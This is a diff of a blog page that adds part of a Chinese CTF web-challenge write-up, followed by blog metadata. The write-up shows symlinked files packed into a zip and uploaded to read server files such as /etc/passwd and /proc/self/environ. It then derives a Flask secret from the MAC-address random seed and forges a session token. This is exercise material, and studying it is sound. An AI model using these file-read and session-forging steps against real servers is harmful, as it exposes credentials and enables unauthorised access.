+<h3 id="zip软链接方式"><a href="#zip软链接方式" class="headerlink" title="zip软链接方式"></a>zip软链接方式</h3><p>以本题环境为例，加入需要读取服务器上&#x2F;etc&#x2F;passwd的内容，通过以下方式构造payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd passwd #在本地创建一个passwd的软链接，当然软链接名字可以随便取</span><br><span class="line">zip -y passwd.zip passwd #以zip -y的方式创建软链接的压缩包</span><br></pre></td></tr></table></figure>
+
+<p>因为站点允许上传zip文件，并且会在线解压并读取文件内容，所以通过此方式可以实现读取服务器上的文件。</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856334.png" alt="image-20211012182549021"></p>
+<p>如图，成功读取到了服务器上的&#x2F;etc&#x2F;passwd文件。</p>
+<p>这时，可以通过&#x2F;proc&#x2F;self&#x2F;environ文件的软链接，读取到服务器上的env中的变量。同理构造payload，读取到uwsgi的配置文件</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856335.png" alt="image-20211012182827766"></p>
+<p>目前由于题目docker环境有问题，实际配置文件路径比这个复杂。</p>
+<p>然后通过读取配置文件，拿到main.py文件的内容（路径也很复杂），然后看到站点的session管理部分内容。</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856336.png" alt="image-20211012183006342"></p>
+<p>这里已知，random以服务器网卡mac地址的10进制为随机数种子，这时候需要读取网卡的mac地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/net/dev dev #查看dev名称得到网卡名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856337.png" alt="image-20211012183750384"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /sys/class/net/eth0/address eth0 #查看eth0的软链接</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856338.png" alt="image-20211012183838711"></p>
+<p>拿到网卡地址之后就可以算出随机数种子了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;02:42:ac:13:00:02&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr) <span class="comment">#51.744030079796296</span></span><br></pre></td></tr></table></figure>
+
+<p>使用flask_session_manager.py构造jwt，此前通过解码首次登录之后的session的jwt值，确定格式。</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856339.png" alt="image-20211012184407993"></p>
+<p>修改session之后，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/BMlovePanda/picgo_imgs/main/img/202202151856340.png" alt="image-20211012184335150"></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1>
       
     </div>
 
@@ -246,7 +439,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-02-15 18:48:01" itemprop="dateModified" datetime="2022-02-15T18:48:01+08:00">2022-02-15</time>
+                <time title="Modified: 2022-02-15 18:59:34" itemprop="dateModified" datetime="2022-02-15T18:59:34+08:00">2022-02-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -254,7 +447,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF-s-WriteUp/" itemprop="url" rel="index"><span itemprop="name">CTF's WriteUp</span></a>
                 </span>
             </span>
 
@@ -475,7 +668,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -488,7 +681,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
